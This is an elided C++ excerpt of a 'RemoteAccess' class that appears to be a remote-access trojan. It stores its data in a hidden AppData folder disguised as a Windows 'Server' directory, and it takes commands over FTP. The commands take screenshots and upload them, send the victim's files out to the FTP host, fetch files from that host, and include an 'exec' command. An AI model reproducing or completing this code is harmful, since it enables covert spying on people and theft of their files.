...
RemoteAccess::RemoteAccess(const std::string &host, const std::string &username, const std::string &password)
	: ftp_host(host), ftp_username(username), ftp_password(password),
	  ftp_connection(FtpConnect(ftp_host, ftp_username, ftp_password)),
	  win_username(WinApi::get_username()),
	  store_path("C:\\Users\\" + win_username + "\\AppData\\Local\\Microsoft\\Windows\\Server"),
...
void RemoteAccess::compile(const std::string &file_path)
{
	std::string code = WinApi::read_file(file_path);
...
void RemoteAccess::execute(const std::vector<std::string>& spl_line)
{
	try {
		...
		if (main_cmd == "print") {
			...
			if (spl_line.size() < 2) {
				WinApi::append_file(output_path, "[!] Error [!]\n\n");
				return;
			}

			WinApi::append_file(output_path, "[>] " + spl_line[1] + " [<]\n\n");
		}
			...
			{
				std::string screenshot_path = WinApi::screenshot(data_path);
				Sleep(500);
				ftp_connection.upload_file(screenshot_path, std::filesystem::path(screenshot_path).filename().u8string());
				Sleep(1000);
				WinApi::append_file(output_path, "[-] Screenhost done >> " + screenshot_path + " [-]\n\n");
			}
			...
			if (!ftp_connection.cd("uploads")) {
				WinApi::append_file(output_path, "[!] Uploads folder not found [!]\n\n");
				return;
			}

			if (ftp_connection.retr_file(spl_line[2], spl_line[1]))
				WinApi::append_file(output_path, "[-] Sucessfully uploaded file [-]\n\n");
			else
				WinApi::append_file(output_path, "[!] Error while uploading file [!]\n\n");
			...
			if (ftp_connection.upload_file(spl_line[1], std::filesystem::path(spl_line[1]).filename().u8string()))
				WinApi::append_file(output_path, "[-] Sucessfully downloaded file [-]\n\n");
			else
				WinApi::append_file(output_path, "[!] Error while downloading file [!]\n\n");
		...
		else if (main_cmd == "exec")
		{
			...
			WinApi::append_file(output_path, "[!] Command: " + main_cmd + " not found [!]\n\n");
		}
